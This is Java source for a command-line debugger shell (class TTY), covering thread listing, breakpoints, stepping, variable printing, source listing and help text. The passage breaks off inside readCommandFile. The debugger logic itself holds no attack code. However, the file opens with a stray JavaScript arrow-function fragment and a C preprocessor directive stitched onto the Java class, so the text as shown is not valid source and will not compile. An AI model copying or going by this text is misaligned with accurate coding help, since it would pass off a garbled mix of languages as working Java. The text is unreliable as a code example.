const functionName = (-0) => { 
#ifndef _java_dbg
  public class TTY implements DebuggerCallback {
    RemoteDebugger debugger;
    RemoteThread currentThread;
    RemoteThreadGroup currentThreadGroup;
    PrintStream out = null;
    PrintStream console = null;

    private String lastArgs = null;
    
    private RemoteThread indexToThread(int index) throws Exception {
	setDefaultThreadGroup();
        RemoteThread list[] = currentThreadGroup.listThreads(true);
	if (index == 0 || index > list.length) {
	    return null;
	}
	return list[index-1];
    }

    private int parseThreadId(String idToken) throws Exception {
	if (idToken.startsWith("t@")) {
	    idToken = idToken.substring(2);
	}

	int threadId;
	try {
	    threadId = Integer.valueOf(idToken).intValue();
	} catch (NumberFormatException e) {
	    threadId = 0;
	}
	if (indexToThread(threadId) == null) {
	    out.println("\"" + idToken +
			       "\" is not a valid thread id.");
	    return 0;
	}
	return threadId;
    }

    private void printPrompt() throws Exception {
        if (currentThread == null) {
            out.print("> ");
        } else {
            out.print(currentThread.getName() + "[" +
                      (currentThread.getCurrentFrameIndex() + 1)
                      + "] ");
        }
        out.flush();
    }

    public synchronized void printToConsole(String text) throws Exception {
        console.print(text);
        console.flush();
    }

    public void breakpointEvent(RemoteThread t) throws Exception {
	out.print("\nBreakpoint hit: ");

	RemoteStackFrame[] stack = t.dumpStack();
	if (stack.length > 0) {
	    out.println(stack[0].toString());
            currentThread = t;
	} else {
	    out.println("Invalid thread specified in breakpoint.");
	}
        printPrompt();
    }

    public void exceptionEvent(RemoteThread t, String errorText) 
      throws Exception {
	out.println("\n" + errorText);
	t.setCurrentFrameIndex(0);
	currentThread = t;
        printPrompt();
    }

    public void threadDeathEvent(RemoteThread t) throws Exception {
	out.println("\n" + t.getName() + " died.");
        if (t == currentThread) {
            currentThread = null;
        }
        printPrompt();
    }

    public void quitEvent() throws Exception {
	out.println("\nThe application has exited");
        System.exit(0);
    }

    void classes() throws Exception {
	RemoteClass list[] = debugger.listClasses();

	out.println("** classes list **");
	for (int i = 0 ; i < list.length ; i++) {
	    out.println(list[i].description());
	}
    }

    void methods(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("No class specified.");
	    return;
	}

	String idClass = t.nextToken();
	try {
	    RemoteClass cls = getClassFromToken(idClass);

	    RemoteField methods[] = cls.getMethods();
	    for (int i = 0; i < methods.length; i++) {
		out.println(methods[i].getType());
	    }
	} catch (IllegalArgumentException e) {
	    out.println("\"" + idClass +
			       "\" is not a valid id or class name.");
	}
    }

    int printThreadGroup(RemoteThreadGroup tg, int iThread) throws Exception {
	out.println("Group " + tg.getName() + ":");
	RemoteThread tlist[] = tg.listThreads(false);

	int maxId = 0;
	int maxName = 0;
	for (int i = 0 ; i < tlist.length ; i++) {
	    int len = tlist[i].description().length();
	    if (len > maxId)
		maxId = len;
	    String name = tlist[i].getName();
	    int iDot = name.lastIndexOf('.');
	    if (iDot >= 0 && name.length() > iDot) {
		name = name.substring(iDot + 1);
	    }
	    if (name.length() > maxName)
		maxName = name.length();
	}

	for (int i = 0 ; i < tlist.length ; i++) {
	    char buf[] = new char[80];
	    for (int j = 0; j < 79; j++) {
		buf[j] = ' ';
	    }
	    buf[79] = '\0';
	    StringBuffer sbOut = new StringBuffer();
	    sbOut.append(buf);

	    sbOut.insert(((i + iThread + 1) < 10) ? 1 : 0, (i + iThread + 1));
	    sbOut.insert(2, ".");
	    int iBuf = 4;
	    sbOut.insert(iBuf, tlist[i].description());
	    iBuf += maxId + 1;
	    String name = tlist[i].getName();
	    int iDot = name.lastIndexOf('.');
	    if (iDot >= 0 && name.length() > iDot) {
		name = name.substring(iDot + 1);
	    }
	    sbOut.insert(iBuf, name);
	    iBuf += maxName + 1;
	    sbOut.insert(iBuf, tlist[i].getStatus());
	    sbOut.setLength(79);
	    out.println(sbOut.toString());
	}

	RemoteThreadGroup tglist[] = debugger.listThreadGroups(tg);
	for (int ig = 0; ig < tglist.length; ig++) {
	    if (tg != tglist[ig]) {
		iThread += printThreadGroup(tglist[ig], iThread + tlist.length);
	    }
	}
	return tlist.length;
    }

    private void setDefaultThreadGroup() throws Exception {
	if (currentThreadGroup == null) {
	    RemoteThreadGroup tglist[] = debugger.listThreadGroups(null);
	    currentThreadGroup = tglist[0];	// system threadgroup
	}
    }
    
    void threads(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    setDefaultThreadGroup();
	    printThreadGroup(currentThreadGroup, 0);
	    return;
	}
	String name = t.nextToken();
	RemoteThreadGroup tglist[] = debugger.listThreadGroups(null);
	for (int i = 0; i < tglist.length; i++) {
	    if (name.equals(tglist[i].getName())) {
		printThreadGroup(tglist[i], 0);
		return;
	    }
	}
	out.println(name + " is not a valid threadgroup name.");
    }

    void threadGroups() throws Exception {
	RemoteThreadGroup tglist[] = debugger.listThreadGroups(null);
	for (int i = 0; i < tglist.length; i++) {
	    out.println(new Integer(i+1).toString() + ". " +
			       tglist[i].description() + " " +
			       tglist[i].getName());
	}
    }

    void setThread(int threadId) throws Exception {
	setDefaultThreadGroup();
	RemoteThread thread = indexToThread(threadId);
	if (thread == null) {
	    out.println("\"" + threadId +
			       "\" is not a valid thread id.");
	    return;
	}
	currentThread = thread;
    }
    
    void thread(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("Thread number not specified.");
	    return;
	}
	int threadId = parseThreadId(t.nextToken());
	if (threadId == 0) {
	    return;
	}
	setThread(threadId);
    }
    
    void threadGroup(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("Threadgroup name not specified.");
	    return;
	}
	String name = t.nextToken();
	RemoteThreadGroup tglist[] = debugger.listThreadGroups(null);
	for (int i = 0; i < tglist.length; i++) {
	    if (name.equals(tglist[i].getName())) {
		currentThreadGroup = tglist[i];
		return;
	    }
	}
	out.println(name + " is not a valid threadgroup name.");
    }
    
    void run(StringTokenizer t) throws Exception {
	String argv[] = new String[100];
	int argc = 0;

	if (!t.hasMoreTokens() && lastArgs != null) {
	    t = new StringTokenizer(lastArgs);
	    out.println("run " + lastArgs);
	}
	while (t.hasMoreTokens()) {
	    argv[argc++] = t.nextToken();
            if (argc == 1) {
                // Expand name, if necessary.
                RemoteClass cls = debugger.findClass(argv[0]);
                if (cls == null) {
                    out.println("Could not load the " + argv[0] + " class.");
                    return;
                }
                argv[0] = cls.getName();
            }
	}

	if (argc > 0) {
	    RemoteThreadGroup newGroup = debugger.run(argc, argv);
	    if (newGroup != null) {
		currentThreadGroup = newGroup;
		setThread(1);
		out.println("running ...");
	    } else {
		out.println(argv[0] + " failed.");
	    }
	} else {
	    out.println("No class name specified.");
	}
    }

    void load(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("Class name not specified.");
	    return;
	}
	String idToken = t.nextToken();
	RemoteClass cls = debugger.findClass(idToken);
	if (cls == null) {
	    out.print(idToken + " not found");
	    out.println((idToken.indexOf('.') > 0) ?
			       " (try the full name)" : "");
	} else {
	    out.println(cls.toString());
	}
    }

    void suspend(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    setDefaultThreadGroup();
	    RemoteThread list[] = currentThreadGroup.listThreads(true);
	    for (int i = 0; i < list.length; i++) {
		list[i].suspend();
	    }
	    out.println("All (non-system) threads suspended.");
	} else {
	    while (t.hasMoreTokens()) {
		String idToken = t.nextToken();
		int threadId;
		try {
		    threadId = Integer.valueOf(idToken).intValue();
		} catch (NumberFormatException e) {
		    threadId = 0;
		}
		RemoteThread thread = indexToThread(threadId);
		if (thread == null) {
		    out.println("\"" + idToken +
				       "\" is not a valid thread id.");
		    continue;
		}
		thread.suspend();
	    }
	}
    }

    void resume(StringTokenizer t) throws Exception {
 	if (!t.hasMoreTokens()) {
	    setDefaultThreadGroup();
	    RemoteThread list[] = currentThreadGroup.listThreads(true);
	    for (int i = 0; i < list.length; i++) {
		list[i].resume();
	    }
	    if (currentThread != null) {
		currentThread.resetCurrentFrameIndex();
	    }
 	    out.println("All threads resumed.");
 	} else {
 	    while (t.hasMoreTokens()) {
 		String idToken = t.nextToken();
 		int threadId;
 		try {
 		    threadId = Integer.valueOf(idToken).intValue();
 		} catch (NumberFormatException e) {
 		    threadId = 0;
 		}
		RemoteThread thread = indexToThread(threadId);
		if (thread == null) {
 		    out.println("\"" + idToken +
				       "\" is not a valid thread id.");
 		    continue;
 		}
 		thread.resume();
 		if (thread == currentThread) {
 		    currentThread.resetCurrentFrameIndex();
 		}
  	    }
	}
    }

    void cont() throws Exception {
	if (currentThread == null) {
	    out.println("Nothing suspended.");
	    return;
	}
	setDefaultThreadGroup();
	RemoteThread list[] = currentThreadGroup.listThreads(true);
	for (int i = 0; i < list.length; i++) {
	    list[i].cont();
	}
	currentThread.resetCurrentFrameIndex();
    }

    void step() throws Exception {
	if (currentThread == null) {
	    out.println("Nothing suspended.");
	    return;
	}
	try {
	    currentThread.step(true);
	} catch (IllegalAccessError e) {
	    out.println("Current thread is not at breakpoint.");
	}
    }

    void next() throws Exception {
	if (currentThread == null) {
	    out.println("Nothing suspended.");
	    return;
	}
	try {
	    currentThread.next();
	} catch (IllegalAccessError e) {
	    out.println("Current thread is not at breakpoint.");
	}
    }

    void kill(StringTokenizer t) throws Exception {
 	if (!t.hasMoreTokens()) {
	    out.println("Usage: kill <threadgroup name> or <thread id>");
	    return;
	}
	while (t.hasMoreTokens()) {
	    String idToken = t.nextToken();
	    int threadId;
	    try {
		threadId = Integer.valueOf(idToken).intValue();
	    } catch (NumberFormatException e) {
		threadId = 0;
	    }
	    RemoteThread thread = indexToThread(threadId);
	    if (thread != null) {
                out.println("killing thread: " + thread.getName());
		thread.stop();
                return;
	    } else {
		/* Check for threadgroup name, skipping "system". */
		RemoteThreadGroup tglist[] = debugger.listThreadGroups(null);
		tglist = debugger.listThreadGroups(tglist[0]);
		for (int i = 0; i < tglist.length; i++) {
		    if (tglist[i].getName().equals(idToken)) {
                        out.println("killing threadgroup: " + idToken);
			tglist[i].stop();
			return;
		    }
		}
		
		out.println("\"" + idToken +
				   "\" is not a valid threadgroup or id.");
	    }
	}
    }

    void catchException(StringTokenizer t) throws Exception {
 	if (!t.hasMoreTokens()) {
	    String exceptionList[] = debugger.getExceptionCatchList();
	    for (int i = 0; i < exceptionList.length; i++) {
		out.print("  " + exceptionList[i]);
		if ((i & 4) == 3 || (i == exceptionList.length - 1)) {
		    out.println();
		}
	    }
	} else {
	    String idClass = t.nextToken();
	    try {
		RemoteClass cls = getClassFromToken(idClass);
		cls.catchExceptions();
	    } catch (Exception e) {
		out.println("Invalid exception class name: " + idClass);
	    }
	}
    }
    
    void ignoreException(StringTokenizer t) throws Exception {
 	if (!t.hasMoreTokens()) {
	    String exceptionList[] = debugger.getExceptionCatchList();
	    for (int i = 0; i < exceptionList.length; i++) {
		out.print("  " + exceptionList[i]);
		if ((i & 4) == 3 || (i == exceptionList.length - 1)) {
		    out.println();
		}
	    }
	} else {
	    String idClass = t.nextToken();
	    try {
		RemoteClass cls = getClassFromToken(idClass);
		cls.ignoreExceptions();
	    } catch (Exception e) {
		out.println("Invalid exception class name: " + idClass);
	    }
	}
    }
    
    void up(StringTokenizer t) throws Exception {
	if (currentThread == null) {
	    out.println("Current thread not set.");
	    return;
	}

	int nLevels = 1;
	if (t.hasMoreTokens()) {
	    String idToken = t.nextToken();
	    int n;
	    try {
		n = Integer.valueOf(idToken).intValue();
	    } catch (NumberFormatException e) {
		n = 0;
	    }
	    if (n == 0) {
		out.println("Usage: up [n frames]");
		return;
	    }
	    nLevels = n;
	}

	try {
	    currentThread.up(nLevels);
	} catch (IllegalAccessError e) {
	    out.println("Thread isn't suspended.");
	} catch (ArrayIndexOutOfBoundsException e) {
	    out.println("End of stack.");
	}
    }

    void down(StringTokenizer t) throws Exception {
	if (currentThread == null) {
	    out.println("Current thread not set.");
	    return;
	}

	int nLevels = 1;
	if (t.hasMoreTokens()) {
	    String idToken = t.nextToken();
	    int n;
	    try {
		n = Integer.valueOf(idToken).intValue();
	    } catch (NumberFormatException e) {
		n = 0;
	    }
	    if (n == 0) {
		out.println("usage: down [n frames]");
		return;
	    }
	    nLevels = n;
	}

	try {
	    currentThread.down(nLevels);
	} catch (IllegalAccessError e) {
	    out.println("Thread isn't suspended.");
	} catch (ArrayIndexOutOfBoundsException e) {
	    out.println("End of stack.");
	}
    }

    void dumpStack(RemoteThread thread) throws Exception {
	RemoteStackFrame[] stack = thread.dumpStack();
	if (stack.length == 0) {
	    out.println("Thread is not running (no stack).");
	} else {
	    int nFrames = stack.length;
	    for (int i = thread.getCurrentFrameIndex(); i < nFrames; i++) {
		out.print("  [" + (i + 1) + "] ");
		out.println(stack[i].toString());
	    }
	}
    }

    void where(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    if (currentThread == null) {
		out.println("No thread specified.");
		return;
	    }
	    dumpStack(currentThread);
	} else {
	    String token = t.nextToken();
	    if (token.toLowerCase().equals("all")) {
		setDefaultThreadGroup();
		RemoteThread list[] = currentThreadGroup.listThreads(true);
		for (int i = 0; i < list.length; i++) {
		    out.println(list[i].getName() + ": ");
		    dumpStack(list[i]);
		}
	    } else {
		int threadId = parseThreadId(token);
		if (threadId == 0) {
		    return;
		}
		dumpStack(indexToThread(threadId));
	    }
	}
    }

    void trace(String cmd, StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("(i)trace < \"on\" | \"off\" >");
	    return;
	}
	
	String v = t.nextToken();
	boolean traceOn;
	if (v.equals("on")) {
	    traceOn = true;
	} else if (v.equals("off")) {
	    traceOn = false;
	} else {
	    out.println("(i)trace < \"on\" | \"off\" >");
	    return;
	}

	if (cmd.equals("trace")) {
	    debugger.trace(traceOn);
	} else {
	    debugger.itrace(traceOn);
	}
    }

    void memory() throws Exception {
	out.println("Free: " + debugger.freeMemory() + ", total: " +
			   debugger.totalMemory());
    }

    void gc() throws Exception {
        RemoteObject[] save_list = new RemoteObject[2];
        save_list[0] = currentThread;
        save_list[1] = currentThreadGroup;
        debugger.gc(save_list);
    }

    private RemoteClass getClassFromToken(String idToken) throws Exception {
	RemoteObject obj;
	if (idToken.startsWith("0x") ||
	    Character.isDigit(idToken.charAt(0))) {
	    /* It's an object id. */
	    int id;
	    try {
		id = RemoteObject.fromHex(idToken);
	    } catch (NumberFormatException e) {
		id = 0;
	    }
	    if (id == 0 || (obj = debugger.get(new Integer(id))) == null) {
		throw new IllegalArgumentException();
	    } else if (!(obj instanceof RemoteClass)) {
		throw new IllegalArgumentException();
	    }
	} else {
	    /* It's a class */
	    obj = debugger.findClass(idToken);
	    if (obj == null) {
		throw new IllegalArgumentException();
	    }
	}
	return (RemoteClass)obj;
    }

    void listBreakpoints() throws Exception {
        String bkptList[] = debugger.listBreakpoints();
	if (bkptList.length > 0) {
            out.println("Current breakpoints set:");
            for(int i = 0; i < bkptList.length; i++) {
                out.println("\t" + bkptList[i]);
            }
	} else {
	    out.println("No breakpoints set.");
	}
    }

    void stop(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    listBreakpoints();
	    return;
	}
	
	String idClass = null;
	try {
	    String modifier = t.nextToken();
	    boolean stopAt;
	    if (modifier.equals("at")) {
		stopAt = true;
	    } else if (modifier.equals("in")) {
		stopAt = false;
	    } else {
		out.println("Usage: stop at <class>:<line_number> or");
		out.println("       stop in <class>.<method_name>");
		return;
	    }

	    if (modifier.equals("at")) {
		idClass = t.nextToken(": \t\n\r");
		RemoteClass cls = getClassFromToken(idClass);

		String idLine = t.nextToken();
		int lineno = Integer.valueOf(idLine).intValue();

		String err = cls.setBreakpointLine(lineno);
		if (err.length() > 0) {
		    out.println(err);
		} else {
		    out.println("Breakpoint set at " + cls.getName() +
				       ":" + lineno);
		}
	    } else {
		idClass = t.nextToken(": \t\n\r");
                RemoteClass cls = null;
                String idMethod = null;

                try {
                    cls = getClassFromToken(idClass);
                } catch (IllegalArgumentException e) {
                    // Try stripping method from class.method token.
                    int idot = idClass.lastIndexOf(".");
                    if (idot == -1) {
                        out.println("\"" + idClass +
                            "\" is not a valid id or class name.");
                        return;
                    }
                    idMethod = idClass.substring(idot + 1);
                    idClass = idClass.substring(0, idot);
                    cls = getClassFromToken(idClass);
                }

                if (idMethod == null) {
                    idMethod = t.nextToken();
                }
		RemoteField method = cls.getMethod(idMethod);
		if (method == null) {
		    out.println("Class " + cls.getName() +
				       " doesn't have a method " + idMethod);
		    return;
		}
		String err = cls.setBreakpointMethod(method);
		if (err.length() > 0) {
		    out.println(err);
		} else {
		    out.println("Breakpoint set in " + cls.getName() +
				       "." + idMethod);
		}
	    }
	} catch (NoSuchElementException e) {
		out.println("Usage: stop at <class>:<line_number> or");
		out.println("       stop in <class>.<method_name>");
	} catch (NumberFormatException e) {
	    out.println("Invalid line number.");
	} catch (IllegalArgumentException e) {
	    out.println("\"" + idClass +
			       "\" is not a valid id or class name.");
	}
    }

    void clear(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    listBreakpoints();
	    return;
	}
	
	String idClass = null;
	String idMethod = null;
	RemoteClass cls = null;
	try {
	    idClass = t.nextToken(": \t\n\r");
	    try {
	        cls = getClassFromToken(idClass);
            } catch (IllegalArgumentException e) {
                // Try stripping method from class.method token.
                int idot = idClass.lastIndexOf(".");
                if (idot == -1) {
                    out.println("\"" + idClass +
                        "\" is not a valid id or class name.");
                    return;
                }
                idMethod = idClass.substring(idot + 1);
                idClass = idClass.substring(0, idot);
                cls = getClassFromToken(idClass);
		RemoteField method = cls.getMethod(idMethod);
		if (method == null) {
		    out.println("\"" + idMethod + 
				"\" is not a valid method name of class " +
				cls.getName());
		    return;
		}
		String err = cls.clearBreakpointMethod(method);
	        if (err.length() > 0) {
		    out.println(err);
	        } else {
		    out.println("Breakpoint cleared at " + 
				cls.getName() + "." + idMethod);
		}
		return;
            }

	    String idLine = t.nextToken();
	    int lineno = Integer.valueOf(idLine).intValue();

	    String err = cls.clearBreakpointLine(lineno);
	    if (err.length() > 0) {
		out.println(err);
	    } else {
		out.println("Breakpoint cleared at " + cls.getName() +
				   ": " + lineno);
	    }
	} catch (NoSuchElementException e) {
	    out.println("Usage: clear <class>:<line_number>");
	    out.println("   or: clear <class>.<method>");
	} catch (NumberFormatException e) {
	    out.println("Usage: clear <class>:<line_number>");
	    out.println("   or: clear <class>.<method>");
	} catch (IllegalArgumentException e) {
	    out.println("\"" + idClass +
			       "\" is not a valid id or class name.");
	}
    }

    void list(StringTokenizer t) throws Exception {
	RemoteStackFrame frame = null;
	if (currentThread == null) {
	    out.println("No thread specified.");
	    return;
	}
	try {
	    frame = currentThread.getCurrentFrame();
	} catch (IllegalAccessError e) {
	    out.println("Current thread isn't suspended.");
	    return;
	} catch (ArrayIndexOutOfBoundsException e) {
	    out.println("Thread is not running (no stack).");
	    return;
	}
	
	int lineno;
	if (t.hasMoreTokens()) {
	    String idLine = t.nextToken();
	    lineno = Integer.valueOf(idLine).intValue();
	} else {
	    lineno = frame.getLineNumber();
	}
	int startLine = (lineno > 4) ? lineno - 4 : 1;
	int endLine = startLine + 9;

	InputStream rawSourceFile = frame.getRemoteClass().getSourceFile();
	if (rawSourceFile == null) {
	    out.println("Unable to find " + 
                        frame.getRemoteClass().getSourceFileName());
	    return;
	}

	DataInputStream sourceFile = new DataInputStream(rawSourceFile);
	String sourceLine = null;

	/* Skip through file to desired window. */
	for (int i = 1; i <= startLine; i++) {
	    sourceLine = sourceFile.readLine();
	}
	if (sourceLine == null) {
	    out.println(new Integer(lineno).toString() +
                        " is an invalid line number for the file " +
                        frame.getRemoteClass().getSourceFileName());
	}

	/* Print lines */
	for (int i = startLine; i < endLine && sourceLine != null; i++) {
	    out.print(new Integer(i).toString() + "\t" +
			     ((i == lineno) ? "=> " : "   "));
	    out.println(sourceLine);
	    sourceLine = sourceFile.readLine();
	}
	    
    }

    /* Get or set the source file path list. */
    void use(StringTokenizer t) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println(debugger.getSourcePath());
	} else {
	    debugger.setSourcePath(t.nextToken());
	}
    }

    /* Print all local variables in current stack frame. */
    void locals() throws Exception {
	if (currentThread == null) {
	    out.println("No default thread specified: " +
			       "use the \"thread\" command first.");
	    return;
	}
	RemoteStackVariable rsv[] = currentThread.getStackVariables();
	if (rsv == null || rsv.length == 0) {
	    out.println("No local variables: try compiling with -g");
	    return;
	}
	out.println("Local variables and arguments:");
	for (int i = 0; i < rsv.length; i++) {
	    out.print("  " + rsv[i].getName());
	    if (rsv[i].inScope()) {
		out.println(" = " + rsv[i].getValue().toString());
	    } else {
		out.println(" is not in scope.");
	    }
	}
	return;
    }

    /* Print a specified reference.  Returns success in resolving reference. */
    boolean print(StringTokenizer t, boolean dumpObject, boolean recursing) throws Exception {
	if (!t.hasMoreTokens()) {
	    out.println("No objects specified.");
	    return false;
	}

	while (t.hasMoreTokens()) {
	    int id;
	    RemoteValue obj = null;

	    String delimiters = ".[(";
	    String expr = t.nextToken();
	    StringTokenizer pieces =
		new StringTokenizer(expr, delimiters, true);

	    String idToken = pieces.nextToken(); // There will be at least one.
	    String varName = expr;
	    if (idToken.startsWith("t@")) {
		/* It's a thread */
		setDefaultThreadGroup();
		RemoteThread tlist[] = currentThreadGroup.listThreads(true);
		try {
		    id = Integer.valueOf(idToken.substring(2)).intValue();
		} catch (NumberFormatException e) {
		    id = 0;
		}
		if (id <= 0 || id > tlist.length) {
		    out.println("\"" + idToken +
				       "\" is not a valid thread id.");
		    return false;
		}
		obj = tlist[id - 1];

	    } else if (idToken.startsWith("$s")) {
		int slotnum;
		try {
		    slotnum = Integer.valueOf(idToken.substring(2)).intValue();
		} catch (NumberFormatException e) {
		    out.println("\"" + idToken +
				       "\" is not a valid slot.");
		    return false;
		}
		if (currentThread != null) {
		    RemoteStackVariable rsv[] = currentThread.getStackVariables();
		    if (rsv == null || slotnum >= rsv.length) {
			out.println("\"" + idToken +
					   "\" is not a valid slot.");
			return false;
		    }
		    obj = rsv[slotnum].getValue();
		}
		
	    } else if (idToken.startsWith("0x") ||
		       Character.isDigit(idToken.charAt(0))) {
		/* It's an object id. */
		try {
		    id = RemoteObject.fromHex(idToken);
		} catch (NumberFormatException e) {
		    id = 0;
		}
		if (id == 0 || (obj = debugger.get(new Integer(id))) == null) {
		    out.println("\"" + idToken +
				       "\" is not a valid id.");
		    return false;
		}
	    } else {
		/* See if it's a local stack variable */
		if (currentThread != null) {
		    RemoteStackVariable rsv =
			currentThread.getStackVariable(idToken);
		    if (rsv != null && !rsv.inScope()) {
		        out.println(idToken + " is not in scope.");
			return false;
		    }
		    obj = (rsv == null) ? null : rsv.getValue();
		}
		if (obj == null) {
		    if (idToken.equals("this") == false) {
			/* See if it's an instance variable */
			String instanceStr = "this." + idToken;
			if (print(new StringTokenizer(instanceStr),
				  dumpObject, true))
			    return true;
		    }
		    
		    /* It's a class */
		    obj = debugger.findClass(idToken);
		    if (obj == null) {
			if (!recursing) {
			    out.println("\"" + expr + "\" is not a " +
					       "valid id or class name.");
			}
			return false;
		    }
		}
	    }

	    RemoteInt noValue = new RemoteInt(-1);
	    RemoteValue rv = noValue;
	    String lastField = "";
	    idToken = pieces.hasMoreTokens() ? pieces.nextToken() : null;
	    while (idToken != null) {

		if (idToken.equals(".")) {
		    if (pieces.hasMoreTokens() == false) {
			out.println("\"" + expr +
					   "\" is not a valid expression.");
			return false;
		    }
		    idToken = pieces.nextToken();

		    if (rv != noValue) {
			/* attempt made to get a field on a non-object */
			out.println("\"" + lastField +
					   "\" is not an object.");
			return false;
		    }
		    lastField = idToken;
			
		    rv = ((RemoteObject)obj).getFieldValue(idToken);
		    if (rv == null) {
			out.println("\"" + idToken +
					   "\" is not a valid field of " +
					   obj.description());
			return false;
		    }
		    if (rv.isObject()) {
			obj = rv;
			rv = noValue;
		    }
		    idToken =
			pieces.hasMoreTokens() ? pieces.nextToken() : null;

		} else if (idToken.equals("[")) {
		    if (pieces.hasMoreTokens() == false) {
			out.println("\"" + expr +
					   "\" is not a valid expression.");
			return false;
		    }
		    idToken = pieces.nextToken("]");
		    try {
			int index = Integer.valueOf(idToken).intValue();
			rv = ((RemoteArray)rv).getElement(index);
		    } catch (NumberFormatException e) {
			out.println("\"" + idToken +
					   "\" is not a valid decimal number.");
			return false;
		    } catch (ArrayIndexOutOfBoundsException e) {
			out.println(idToken + " is out of bounds for " +
					   obj.description());
			return false;
		    }
		    if (rv != null && rv.isObject()) {
			obj = rv;
			rv = noValue;
		    }
		    if (pieces.hasMoreTokens() == false ||
			(idToken = pieces.nextToken()).equals("]") == false) {
			out.println("\"" + expr +
					   "\" is not a valid expression.");
			return false;
		    }
		    idToken = pieces.hasMoreTokens() ?
			pieces.nextToken(delimiters) : null;

		} else if (idToken.equals("(")) {
		    out.println("print <method> not supported yet.");
		    return false;
		} else {
		    /* Should never get here. */
		    out.println("invalid expression");
		    return false;
		}
	    }

	    out.print(varName + " = ");
	    if (rv != noValue) {
		out.println((rv == null) ? "null" : rv.description());
	    } else if (dumpObject && obj instanceof RemoteObject) {
		out.println(obj.description() + " {");

		if (obj instanceof RemoteClass) {
		    RemoteClass cls = (RemoteClass)obj;

		    out.print("    superclass = ");
		    RemoteClass superClass = cls.getSuperclass();
		    out.println((superClass == null) ?
				       "null" : superClass.description());

		    out.print("    loader = ");
		    RemoteObject loader = cls.getClassLoader();
		    out.println((loader == null) ?
				       "null" : loader.description());

		    RemoteClass interfaces[] = cls.getInterfaces();
		    if (interfaces != null && interfaces.length > 0) {
			out.println("    interfaces:");
			for (int i = 0; i < interfaces.length; i++) {
			    out.println("        " + interfaces[i]);
			}
		    }
		}

		RemoteField fields[] = ((RemoteObject)obj).getFields();
		if (obj instanceof RemoteClass && fields.length > 0) {
		    out.println();
		}
		for (int i = 0; i < fields.length; i++) {
		    String name = fields[i].getType();
		    String modifiers = fields[i].getModifiers();
		    out.print("    " + modifiers + name + " = ");
		    RemoteValue v = ((RemoteObject)obj).getFieldValue(i);
		    out.println((v == null) ? "null" : v.description());
		}
		out.println("}");
	    } else {
		out.println(obj.toString());
	    }
	}
	return true;
    }

    void help
	() {
	    out.println("** command list **");
	    out.println("threads [threadgroup]     -- list threads");
	    out.println("thread <thread id>        -- set default thread");
	    out.println("suspend [thread id(s)]    -- suspend threads (default: all)");
	    out.println("resume [thread id(s)]     -- resume threads (default: all)");
	    out.println("where [thread id] | all   -- dump a thread's stack");
	    out.println("threadgroups              -- list threadgroups");
	    out.println("threadgroup <name>        -- set current threadgroup\n");
	    out.println("print <id> [id(s)]        -- print object or field");
	    out.println("dump <id> [id(s)]         -- print all object information\n");
	    out.println("locals                    -- print all local variables in current stack frame\n");
	    out.println("classes                   -- list currently known classes");
	    out.println("methods <class id>        -- list a class's methods\n");
	    out.println("stop in <class id>.<method> -- set a breakpoint in a method");
	    out.println("stop at <class id>:<line> -- set a breakpoint at a line");
	    out.println("up [n frames]             -- move up a thread's stack");
	    out.println("down [n frames]           -- move down a thread's stack");
	    out.println("clear <class id>:<line>   -- clear a breakpoint");
	    out.println("step                      -- execute current line");
	    out.println("cont                      -- continue execution from breakpoint\n");
	    out.println("catch <class id>          -- break for the specified exception");
	    out.println("ignore <class id>         -- ignore when the specified exception\n");
	    out.println("list [line number]        -- print source code");
	    out.println("use [source file path]    -- display or change the source path\n");
	    out.println("memory                    -- report memory usage");
	    out.println("gc                        -- free unused objects\n");
	    out.println("load classname            -- load Java class to be debugged");
	    out.println("run <class> [args]        -- start execution of a loaded Java class");
//	    out.println("kill <thread(group)>      -- kill a thread or threadgroup\n");
	    out.println("!!                        -- repeat last command");
	    out.println("help (or ?)               -- list commands");
	    out.println("exit (or quit)            -- exit debugger");
	}

    void executeCommand(StringTokenizer t) {
	String cmd = t.nextToken().toLowerCase();

	try {
	    if (cmd.equals("print")) {
		print(t, false, false);
	    } else if (cmd.equals("dump")) {
		print(t, true, false);
	    } else if (cmd.equals("locals")) {
		locals();
	    } else if (cmd.equals("classes")) {
		classes();
	    } else if (cmd.equals("methods")) {
		methods(t);
	    } else if (cmd.equals("threads")) {
		threads(t);
	    } else if (cmd.equals("thread")) {
		thread(t);
	    } else if (cmd.equals("suspend")) {
		suspend(t);
	    } else if (cmd.equals("resume")) {
		resume(t);
	    } else if (cmd.equals("threadgroups")) {
		threadGroups();
	    } else if (cmd.equals("threadgroup")) {
		threadGroup(t);
	    } else if (cmd.equals("catch")) {
		catchException(t);
	    } else if (cmd.equals("ignore")) {
		ignoreException(t);
	    } else if (cmd.equals("cont")) {
		cont();
	    } else if (cmd.equals("step")) {
		step();
	    } else if (cmd.equals("next")) {
		next();
            } else if (cmd.equals("kill")) {
                kill(t);
	    } else if (cmd.equals("where")) {
		where(t);
	    } else if (cmd.equals("up")) {
		up(t);
	    } else if (cmd.equals("down")) {
		down(t);
	    } else if (cmd.equals("load")) {
		load(t);
	    } else if (cmd.equals("run")) {
		run(t);
	    } else if (cmd.equals("memory")) {
		memory();
            } else if (cmd.equals("gc")) {
                gc();
	    } else if (cmd.equals("trace") || cmd.equals("itrace")) {
		trace(cmd, t);
	    } else if (cmd.equals("stop")) {
		stop(t);
	    } else if (cmd.equals("clear")) {
		clear(t);
	    } else if (cmd.equals("list")) {
		list(t);
	    } else if (cmd.equals("use")) {
		use(t);
	    } else if (cmd.equals("help") || cmd.equals("?")) {
		help();
	    } else if (cmd.equals("quit") || cmd.equals("exit")) {
		debugger.close();
		System.exit(0);
	    } else {
		out.println("huh? Try help...");
	    }
	} catch (Exception e) {
	    out.println("Internal exception:");
	    out.flush();
	    e.printStackTrace();
	}
    }

    void readCommandFile(File f) {
	try {
	    if (f.canRead()) {
		// Process initial commands.
		DataInputStream inFile = 
		    new DataInputStream(new FileInputStream(f));
		String ln;
